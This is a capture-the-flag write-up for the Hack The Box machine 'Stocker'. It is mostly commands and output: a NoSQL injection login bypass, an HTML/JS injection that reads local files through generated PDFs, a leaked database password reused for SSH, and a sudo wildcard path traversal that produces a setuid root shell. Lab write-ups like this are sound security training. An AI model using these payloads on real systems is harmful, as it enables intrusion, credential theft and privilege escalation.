# Target
| Category          | Details                                                |
|-------------------|--------------------------------------------------------|
| 📝 **Name**       | [Stocker](https://app.hackthebox.com/machines/Stocker) |  
| 🏷 **Type**       | HTB Machine                                            |
| 🖥 **OS**         | Linux                                                  |
| 🎯 **Difficulty** | Easy                                                   |
| 📁 **Tags**       | NoSQLi, MongoDB, NodeJS, LFI                           |

# Scan
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
```

# Attack path
1. [Discover `dev.stocker.htb` host](#discover-devstockerhtb-host)
2. [Gain a foothold via SSH using exfiltrated MongoDB credentials](#gain-a-foothold-via-ssh-using-exfiltrated-mongodb-credentials)
3. [Escalate to `root` user using exploitable wildcard in sudo command](#escalate-to-root-user-using-exploitable-wildcard-in-sudo-command)

### Discover `dev.stocker.htb` host

#### Add `stocker.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Stocker]
└─$ echo "$TARGET stocker.htb" | sudo tee -a /etc/hosts
10.129.228.197 stocker.htb
```

#### Gathered intel by analyzing static web page content
Information found on web page suggest additional virtual hosts.
```
"I can't wait for people to use our new site! It's so fast and easy to use! We're working hard to give you the best experience possible, and we're nearly ready for it to go live!"
```

#### Enumerate virtual hosts
```
┌──(magicrc㉿perun)-[~/attack/HTB Stocker]
└─$ ffuf -r -u http://stocker.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.stocker.htb" -mc 200 -fs 15463

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.stocker.htb
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 15463
________________________________________________

dev                     [Status: 200, Size: 2667, Words: 492, Lines: 76, Duration: 28ms]
```

#### Add discovered `dev.stocker.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Stocker]
└─$ echo "$TARGET dev.stocker.htb" | sudo tee -a /etc/hosts
10.129.228.197 dev.stocker.htb
```

### Gain a foothold via SSH using exfiltrated MongoDB credentials

#### Bypass authentication with NoSQL injection
```
┌──(magicrc㉿perun)-[~/attack/HTB Stocker]
└─$ curl -s -c cookies.txt http://dev.stocker.htb/login -H "Content-Type: application/json" -d  '{"username":{"$ne":null},"password":{"$ne":null}}' -o /dev/null
```

#### Create a Bash alias to exfiltrate files through LFI in `/api/po`, leveraging HTML/JS injection in `/api/order`
We can inject HTML and JS in `title` of elements in `basket`. We are using this vulnerability to include local file (LFI) in `<object data='file://'>`. As there is not enough place render whole file, we are injecting JS in 2nd `title` to replace `document.body.innerHTML` with content of injected `<object>`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Stocker]
└─$ lfi_cat() {
ORDER_ID=$(curl -s -b cookies.txt http://dev.stocker.htb/api/order -H "Content-Type: application/json" -d "{\"basket\":[{\"title\":\"<object id='file' data='file://$1' type='text/plain'></object>","price":1,"amount":1},{"title":"<script>const obj=document.getElementById('file');obj.onload=function(){const content=obj.contentDocument.body.innerText;document.body.innerHTML='<pre>'+content+'</pre>';};</script>\",\"price\":1,\"amount\":1}]}" | jq -r .orderId)
curl -s -b cookies.txt http://dev.stocker.htb/api/po/$ORDER_ID -o lfi.pdf && pdftotext lfi.pdf -
}; alias lfi_cat='lfi_cat'
```

#### List users with shell access
```
┌──(magicrc㉿perun)-[~/attack/HTB Stocker]
└─$ lfi_cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
```

#### Exfiltrate and reformat `/etc/nginx/nginx.conf`
```
┌──(magicrc㉿perun)-[~/attack/HTB Stocker]
└─$ lfi_cat /etc/nginx/nginx.conf | grep -v \# | awk '
{
  gsub(/[ \t]+$/, "")
  if ($0 ~ /^[ \t]*}/) indent--
  for (i = 0; i < indent; i++) printf "  ";
  print
  if ($0 ~ /{[ \t]*$/) indent++
}'
<SNIP>
  server {
    listen 80;
    root /var/www/dev;
    index index.html index.htm index.nginx-debian.html;
    server_name dev.stocker.htb;
    location / {
      proxy_pass http://127.0.0.1:3000;
<SNIP>
```

#### Exfiltrate web application source code
In exfiltrated source code we could find MongoDB credentials.
```
┌──(magicrc㉿perun)-[~/attack/HTB Stocker]
└─$ lfi_cat /var/www/dev/index.js
<SNIP>
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
<SNIP>
```

#### Reuse exfiltrated credentials to gain initial foothold over SSH
```
┌──(magicrc㉿perun)-[~/attack/HTB Stocker]
└─$ ssh angoose@stocker.htb             
angoose@stocker.htb's password: 
Last login: Thu Jun 26 19:56:14 2025 from 10.10.14.157
angoose@stocker:~$ id
uid=1001(angoose) gid=1001(angoose) groups=1001(angoose)
```

### Escalate to `root` user using exploitable wildcard in sudo command

#### Identify exploitable wildcard usage in sudo command 
```
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

#### Exploit wildcard to spawn root shell
```
angoose@stocker:~$ echo "require('child_process').exec('cp /bin/bash /tmp/root_shell;chmod +s /tmp/root_shell');" > /tmp/exploit.js &&
sudo /usr/bin/node /usr/local/scripts/../../../tmp/exploit.js &&
/tmp/root_shell -p
root_shell-5.0# id
uid=1001(angoose) gid=1001(angoose) euid=0(root) egid=0(root) groups=0(root),1001(angoose)
```